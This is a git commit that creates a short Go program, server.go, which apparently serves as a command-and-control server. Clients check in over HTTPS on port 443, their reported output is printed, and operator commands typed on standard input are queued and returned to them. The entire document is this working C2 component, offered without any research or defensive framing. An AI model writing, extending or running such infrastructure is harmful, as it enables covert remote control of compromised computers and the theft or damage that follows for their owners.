255e87f654c18447f2f3af67ddcb98afdcf8489a
Mytk0 <219283551+Mytk0@users.noreply.github.com>
2026-03-29 17:08:00 +0300

    Create server.go
    Initial server commit

---
+++ server/server.go
@@ -0,0 +1,33 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+)
+
+var pendingCmd string = "sleep"
+
+func checkinHandler(w http.ResponseWriter, r *http.Request) {
+	body, _ := io.ReadAll(r.Body)
+	fmt.Println("[checkin]", string(body))
+	fmt.Fprintf(w, pendingCmd)
+	pendingCmd = "sleep" //clear after sending
+}
+
+func readInput() {
+	scanner := bufio.NewScanner(os.Stdin)
+	for scanner.Scan() {
+		pendingCmd = scanner.Text()
+		fmt.Println("[*] Command queued:", pendingCmd)
+	}
+}
+
+func main() {
+	http.HandleFunc("/checkin", checkinHandler)
+	fmt.Println("[+] Server listening on :443")
+	go readInput()
+	http.ListenAndServeTLS(":443", "server.crt", "server.key", nil)
+}
